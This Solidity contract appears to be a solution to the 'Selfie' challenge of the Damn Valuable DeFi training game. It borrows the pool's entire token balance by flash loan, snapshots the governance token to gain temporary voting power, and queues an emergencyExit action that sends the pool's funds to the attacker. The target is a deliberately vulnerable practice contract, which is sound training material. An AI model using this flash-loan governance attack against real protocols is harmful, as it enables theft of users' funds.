// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract SelfieAttacker is IERC3156FlashBorrower {

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    SelfiePool pool;

    constructor(address _governanceAddr, address _tokenAddr, address _poolAddr) {
        governance = SimpleGovernance(_governanceAddr);
        token = DamnValuableTokenSnapshot(_tokenAddr);
        pool = SelfiePool(_poolAddr);
    }

    function attack() public payable {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(pool)), "");
        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", msg.sender);
        governance.queueAction(address(pool), 0, payload);
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();
        token.approve(msg.sender, amount);
        return CALLBACK_SUCCESS;
    }
}
